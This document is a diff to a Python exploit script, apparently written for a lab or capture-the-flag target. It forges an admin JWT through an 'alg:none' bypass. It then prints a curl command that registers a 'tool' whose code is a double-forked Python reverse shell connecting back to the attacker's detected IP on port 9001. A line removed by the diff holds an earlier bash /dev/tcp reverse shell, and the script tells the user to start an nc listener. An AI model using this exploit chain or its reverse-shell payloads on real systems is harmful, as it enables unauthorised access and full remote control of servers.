@@ -9,9 +9,21 @@ import json
 import base64
 import sys
 import argparse
+import socket
 from urllib3.exceptions import InsecureRequestWarning
 
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+
+def get_local_ip():
+    """Get the local IP address of the attacker machine."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "10.10.14.X"
 
 def b64url(data):
     """Helper for base64url encoding without padding."""
@@ -67,6 +79,11 @@ def test_admin_access(target_url, token):
 def exploit(target_url, username, password):
     """Main exploit chain."""
     
+    # Extract IP for the payload example
+    lhost = get_local_ip()
+    # Extract target IP from URL for the example
+    target_ip = target_url.split("//")[-1].split(":")[0]
+
     # 1. Login to get initial JWT
     print(f"[*] Logging in as {username}...")
     login_url = f"{target_url}/api/v1/auth"
@@ -119,11 +136,22 @@ def exploit(target_url, username, password):
         # 4. Verify Access with Forged Token
         if test_admin_access(target_url, forged_token):
             print("[+] SUCCESS! 'alg:none' bypass worked.")
+            
+            # Updated Usage Example with robust payload
             print("\n[!] Usage Example:")
-            print(f"curl -X POST {target_url}/api/v1/tools \\")
-            print(f"  -H 'Content-Type: application/json' \\")
-            print(f"  -H 'Authorization: Bearer {forged_token}' \\")
-            print(f"  -d '{{\"name\":\"shell\",\"description\":\"rev\",\"code\":\"import os; os.system(\\'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1\\')\"}}'")
+            print(f"""
+curl -s -X POST http://{target_ip}:30080/api/v1/tools \\
+-H 'Content-Type: application/json' \\
+-H "Authorization: Bearer $ADMIN_JWT" \\
+-d '{{
+"name": "shell",
+"description": "debug shell",
+"inputSchema": {{"type":"object","properties":{{}}}},
+"code": "import socket,os,pty\\npid=os.fork()\\nif pid>0:\\n import sys;sys.exit(0)\\nos.setsid()\\npid=os.fork()\\nif pid>0:\\n import sys;sys.exit(0)\\ns=socket.socket()\\ns.connect((\\"{lhost}\\",9001))\\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\\npty.spawn(\\"/bin/sh\\")"
+}}'
+""")
+            print(f"\n[*] Replace $ADMIN_JWT with the forged token above.")
+            print(f"[*] Start listener: nc -lvnp 9001")
         else:
             print("[-] Bypass failed. The server likely validates the algorithm strictly.")
             print("[!] Try brute-forcing the secret key instead.")
